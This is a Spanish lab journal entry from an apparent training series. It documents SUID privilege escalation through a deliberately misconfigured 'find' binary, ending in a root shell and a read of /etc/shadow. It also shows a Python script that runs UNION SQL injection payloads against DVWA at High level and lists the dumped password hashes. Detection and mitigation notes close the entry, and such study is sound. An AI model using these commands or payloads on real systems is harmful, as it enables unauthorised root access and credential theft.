# Día 16 — Privilege Escalation Linux: SUID + SQL Injection High

**Fecha:** Abril 2026  
**MITRE:** T1548.001, T1190  
**DVWA:** SQL Injection (High)

---

## Teoría

### Privilege Escalation — SUID
SUID (Set User ID) es un permiso especial en Linux que permite ejecutar un binario con los privilegios del dueño del archivo en lugar del usuario que lo ejecuta. Si un binario con SUID tiene dueño root y puede ejecutar comandos arbitrarios, es un vector de escalada de privilegios. La referencia estándar para binarios explotables es gtfobins.github.io.

### SQL Injection High
En nivel High DVWA mueve el input a una ventana popup (`session-input.php`) que guarda el ID en sesión. La página principal lee el ID de sesión y ejecuta la query. Esta arquitectura complica ataques manuales pero no protege contra scripts que manejen correctamente la sesión entre requests.

---

## Red Team

### Sección 1 — Preparar entorno de escalada

Se creó un usuario sin privilegios para simular un atacante con acceso limitado:

```bash
sudo useradd -m -s /bin/bash lowpriv
sudo passwd lowpriv
```

Verificación de privilegios de lowpriv:
```bash
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
sudo-rs: Sorry, user lowpriv may not run sudo on Ubuntu-Victim.
```

Sin grupos especiales, sin sudo — usuario completamente limitado.

### Sección 2 — Configurar binario SUID vulnerable

Desde vboxuser se simuló un error de administración — activar SUID en `find`:

```bash
sudo cp /usr/bin/find /opt/find_suid
sudo chown root:root /opt/find_suid
sudo chmod u+s /opt/find_suid
ls -la /opt/find_suid
```

```
-rwsr-xr-x 1 root root 233088 Apr 13 22:15 /opt/find_suid
```

La `s` en los permisos confirma SUID activo. Nota: `/tmp` tiene flag `nosuid` en Ubuntu — los binarios SUID en ese directorio son ignorados por el sistema.

### Sección 3 — Explotación SUID

Desde lowpriv, verificación previa:
```bash
/opt/find_suid . -exec whoami \; -quit
```
```
root
```

Explotación — bash con modo privilegiado:
```bash
/opt/find_suid . -exec /bin/bash -p \; -quit
```
```
bash-5.2#
```

**Verificación de escalada:**
```bash
whoami → root
id     → uid=1001(lowpriv) gid=1001(lowpriv) euid=0(root)
```

`euid=0` — el effective user ID es root. Aunque el uid real sigue siendo lowpriv, el sistema usa euid para verificar permisos — acceso total.

**Demostración — lectura de `/etc/shadow`:**
```
vboxuser:$y$j9T$t23wcW0kpA82bAFLmAeHe1$...
lowpriv:$y$j9T$M63lj3LfX.AXcwtx8uwOQ1$...
```

Archivo normalmente restringido a root — leído exitosamente con euid=0.

**Cadena completa:**
```
lowpriv (sin privilegios)
    ↓
/opt/find_suid con SUID root
    ↓
find -exec /bin/bash -p
    ↓
euid=0 (root)
    ↓
Acceso total al sistema
```

### Sección 4 — DVWA SQL Injection (High)

En High el input está en una popup `session-input.php` — el payload se guarda en sesión y la página principal lo ejecuta. Se requirió un script Python para manejar la sesión entre los dos requests y probar múltiples payloads:

```python
import requests
import re

s = requests.Session()
s.cookies.set("PHPSESSID", "<session>")
s.cookies.set("security", "high")

payloads = [
    "1' UNION SELECT user,password FROM users#",
    "1' UNION SELECT user,password FROM users-- -",
    "0' UNION SELECT user,password FROM users#",
    "1 UNION SELECT user,password FROM users-- -",
]

for payload in payloads:
    s.post("http://192.168.1.96:8080/vulnerabilities/sqli/session-input.php",
           data={"id": payload, "Submit": "Submit"})
    r = s.get("http://192.168.1.96:8080/vulnerabilities/sqli/")
    matches = re.findall(r'First name: (.*?)<br />Surname: (.*?)</pre>', r.text)
    if matches:
        print(f"[+] Payload funcionó: {payload}")
        for user, pwd in matches:
            print(f"    {user} : {pwd}")
        break
    else:
        print(f"[-] Fallido: {payload}")
```

**Payload exitoso:** `1' UNION SELECT user,password FROM users#`

**Credenciales extraídas:**

| Usuario | Hash MD5 |
|---------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

**Diferencia entre niveles:**

| Nivel | Input | Método | Payload |
|-------|-------|--------|---------|
| Low | Input text directo | GET/curl | `1' UNION SELECT...-- -` |
| Medium | Dropdown | POST/curl | `1 UNION SELECT...` sin comillas |
| High | Popup session-input.php | Python + sesión | `1' UNION SELECT...#` |

---

## Blue Team

### Detección SUID
- Binarios con SUID fuera de rutas estándar (`/bin`, `/usr/bin`) son sospechosos
- Comando de detección: `find / -perm -4000 -type f 2>/dev/null`
- Un proceso `bash` con euid=0 lanzado por usuario sin privilegios es una alerta crítica

### Mitigación SUID
- Auditar regularmente binarios SUID en el sistema
- Nunca activar SUID en binarios que puedan ejecutar comandos arbitrarios
- Montar particiones con `nosuid` cuando sea posible — Ubuntu ya lo hace en `/tmp`

### Mitigación SQLi High
- Prepared statements — la única defensa real contra SQLi en cualquier nivel
- La arquitectura de popup no es una medida de seguridad — solo dificulta ataques manuales

---

## Conclusión

SUID demuestra que un error de configuración simple puede comprometer completamente un sistema — `find` con SUID root permite escalar de usuario sin privilegios a root en un comando. SQLi High añade complejidad arquitectónica (popup + sesión) pero no protección real — un script Python que maneje correctamente la sesión entre requests bypasea la defensa en segundos. La defensa real siempre es server-side: prepared statements para SQLi, auditoría de SUID para privilege escalation.
